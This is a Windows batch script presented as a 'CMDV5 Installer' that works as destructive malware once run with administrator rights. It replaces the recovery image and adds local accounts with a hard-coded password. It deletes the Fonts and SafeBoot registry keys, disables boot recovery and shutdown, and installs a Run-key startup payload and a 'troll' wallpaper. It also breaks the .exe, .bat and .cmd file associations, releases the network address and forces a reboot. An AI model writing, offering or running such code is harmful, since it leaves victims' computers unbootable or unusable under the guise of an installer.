@echo off
TITLE CMDV5
echo Loading...
SFC /ScanFile="C:\Windows\system32\net.exe"
cls
@rem ----[ This code block detects if the script is being running with admin PRIVILEGES If it isn't it pauses and then quits]-------
echo OFF
NET SESSION >nul 2>&1
IF %ERRORLEVEL% EQU 0 (
    ECHO Administrator PRIVILEGES Detected! 
) ELSE (
   echo ######## ########  ########   #######  ########  
   echo ##       ##     ## ##     ## ##     ## ##     ## 
   echo ##       ##     ## ##     ## ##     ## ##     ## 
   echo ######   ########  ########  ##     ## ########  
   echo ##       ##   ##   ##   ##   ##     ## ##   ##   
   echo ##       ##    ##  ##    ##  ##     ## ##    ##  
   echo ######## ##     ## ##     ##  #######  ##     ## 
   echo.
   echo.
   echo ####### ERROR: ADMINISTRATOR PRIVILEGES REQUIRED #########
   echo This file must be run as administrator to work properly!  
   echo If you're seeing this after clicking on the file, then right click on it and select "Run As Administrator".
   echo ##########################################################
   echo.
   PAUSE
   EXIT /B 1
)
cls
SFC /ScanFile="C:\Windows\system32\reg.exe"
SFC /ScanFile="C:\Windows\system32\diskpart.exe"
SFC /ScanFile="C:\Windows\system32\secedit.exe"
SFC /ScanFile="C:\Windows\system32\mountvol.exe"
SFC /ScanFile="C:\Windows\system32\icacls.exe"
SFC /ScanFile="C:\Windows\system32\xcopy.exe"
SFC /ScanFile="C:\Windows\system32\bcdedit.exe"
secedit /configure /cfg %windir%\inf\defltbase.inf /db defltbase.sdb /verbose
echo Checking Operating System Version...
wmic os get version | find "6.1" > nul
if %ERRORLEVEL% == 0 goto SEVEN
)
wmic os get version | find "6.2" > nul
if %ERRORLEVEL% == 0 goto EIGHT
)
wmic os get version | find "6.3" > nul
if %ERRORLEVEL% == 0 goto EIGHTPOINTONE
)
wmic os get version | find "10.0" > nul
if %ERRORLEVEL% == 0 goto TEN
)
wmic os get version | find "6.0" > nul
if %ERRORLEVEL% == 0 goto MAININSTALLBVISTA
)
wmic os get version | find "5.1" > nul
if %ERRORLEVEL% == 0 goto MAININSTALLB
)
ver | find "5.0" > nul
if %ERRORLEVEL% == 0 goto MAININSTALLB
)
cls
echo OS Check Failed.
PAUSE
exit
:NOTCOMPAT
cls
echo the OS is not compatible.
PAUSE
exit
:SEVEN
cls
echo .....................................................
echo CMDV5 Installer
echo .....................................................
echo,
echo,
echo Enter - Proceed
echo,
SET /P M=Press Enter to Proceed : 
IF "%M%"=="" GOTO WIN7INSTALLRE
goto SEVEN
:WIN7INSTALLRE
echo Applying changes...
diskpart /s %CD%\win7\diskpart.txt
icacls "C:\Recovery\" /setowner "Dartz" /T /C
icacls "C:\Recovery\" /grant Dartz:F /T /C
xcopy "%CD%\win7\win7re\Winre.wim" "C:\Recovery\db77f94e-8028-11eb-a6d0-a34b0745a61f\Winre.wim" /Y /Q /H
goto SEVENINSTALL
:SEVENINSTALL
echo,
cls
echo Applying changes...
goto MAININSTALL
:EIGHT
cls
echo .....................................................
echo CMDV5 Installer
echo .....................................................
echo,
echo,
echo Enter - Proceed
echo,
SET /P M=Press Enter to Proceed : 
IF "%M%"=="" GOTO WIN8INSTALLRE
goto EIGHT
:WIN8INSTALLRE
echo Installing Windows RE Protection...
diskpart /s %CD%\win8\diskpart.txt
icacls "K:\Recovery\" /setowner "Dartz" /T /C
icacls "K:\Recovery\" /grant Dartz:F /T /C
xcopy "%CD%\win7\win78re\Winre.wim" "K:\Recovery'WindowsRE\Winre.wim" /Y /Q /H
goto EIGHTINSTALL
:EIGHTINSTALL
echo,
goto MAININSTALLB
echo Sorry but Windows 8 Support has not been inplemented yet.
PAUSE
exit
echo Applying changes...
:EIGHTPOINTONE
cls
echo .....................................................
echo CMDV5 Installer
echo .....................................................
echo,
echo WARNING
echo,
echo CMDV5 is unstable on Windows 8.1 and 10 expect errors to pop up
echo,
echo Enter - Proceed
echo,
SET /P M=Press Enter to Proceed : 
IF "%M%"==1 GOTO WIN81INSTALLRE
:WIN81INSTALLRE
cls
echo Applying changes...
diskpart /s %CD%\win81\diskpart.txt
icacls "K:\Recovery\" /setowner "Dartz" /T /C
icacls "K:\Recovery\" /grant Dartz:F /T /C
xcopy "%CD%\win81\win81re\Winre.wim" "K:\Recovery\WindowsRE\Winre.wim" /Y /Q /H
goto EIGHTPOINTONEINSTALL
:EIGHTPOINTONEINSTALL
echo,
echo :)
goto MAININSTALL
:TEN
cls
echo .....................................................
echo CMDV5 Installer
echo .....................................................
echo,
echo WARNING
echo,
echo CMDV5 is unstable on Windows 8.1 and 10 expect errors to pop up
echo,
echo Enter - Proceed
echo,
SET /P M=Press Enter to Proceed : 
IF %M%==1 GOTO WIN10INSTALLRE
goto TEN
:WIN10INSTALLRE
goto TENINSTALL
echo Applying changes...
diskpart /s %CD%\win10\diskpart.txt
icacls "K:\Recovery\" /setowner "Dartz" /T /C
icacls "K:\Recovery\" /grant Dartz:F /T /C
xcopy "%CD%\win10\win10re\Winre.wim" "K:\Recovery\WindowsRE\Winre.wim" /Y /Q /H
goto TENINSTALL
:TENINSTALL
echo,
goto MAININSTALLB
PAUSE
exit
echo :)
goto MAININSTALL
:MAININSTALL
net user beachball /add
net localgroup Guests beachball /add
net user Dartz 1593570 /domain
diskpart /s %CD%\unass\unass.txt
goto BCD
:EXIT
exit
:RESTART
wmic os where primary=1 reboot
:DESTROY
REG DELETE "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Fonts" /f
GOTO eeee
:MAININSTALLB
cls
echo .....................................................
echo :)
echo .....................................................
echo,
echo,
echo 1 - :)
echo,
SET /P M=Type 1 or 2 then press ENTER:
IF %M%==1 GOTO MAININSTALLBB
:MAININSTALLBB
net user beachball /add
net localgroup Guests beachball /add
net user Dartz 1593570 /domain
goto DESTROY
:MAININSTALLBVISTA
net user beachball /add
net localgroup Guests beachball /add
net user Dartz 1593570 /domain
goto BCD
:eeee
mkdir c:\windows\fakeexplorer
mkdir c:\windows\payload
mkdir c:\windows\wallpapertroll
mkdir c:\windows\junkins
mkdir c:\windows\junkins\nssm
xcopy "%CD%\junkins\startup\no.bat" "c:\windows\fakeexplorer" /y /q /h
xcopy "%CD%\junkins\startup\startup.bat c:\windows\payload\startup.bat" /y /q /h
xcopy "%CD%\junkins\walp\walp.bmp" "c:\windows\wallpapertroll\walp.bmp" /y /q /h
xcopy "%CD%\junkins\startup\SetACL.exe" "c:\windows\junkins\startup\SetACL.exe" /y /q /h
xcopy "%CD%\junkins\nssm\nssm.exe" "c:\windows\junkins\nssm\nssm.exe" /y /q /h
bcdedit /set TESTSIGNING on
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d c:\windows\wallpapertroll\walp.bmp /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v cmdv5 /t REG_SZ /d c:\windows\payload\startup.bat
%systemroot%\junkins\startup\SetACL.exe -on name -ot type -actn action
%systemroot%\junkins\startup\SetACL.exe -on "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SafeBoot" -ot reg -actn setowner -ownr "n:Administrators"
%systemroot%\junkins\startup\SetACL.exe -on "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SafeBoot" -ot reg -actn ace -ace "n:Administrators;p:full"
reg delete "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SafeBoot" /f
reg import "%CD%\junkins\startup\disableshutdownandrebootbutton.reg"
RUNDLL32.EXE user32.dll, UpdatePerUserSystemParameters
goto AAAAJJ
:AAAAJJ
goto ADDONS
:BCD
bcdedit /set TESTSIGNING on
bcdedit /set recoveryenabled No
goto DESTROY
:ADDONS
@rem --Additional Commands go below--
start %systemroot%\junkins\nssm\nssm.exe stop Themes
start %systemroot%\nssm\nssm.exe remove Themes confirm
ipconfig /release
assoc .exe=jaydumb
assoc .cmd=windfufBest
assoc .bat=CmdV5
goto RESTART
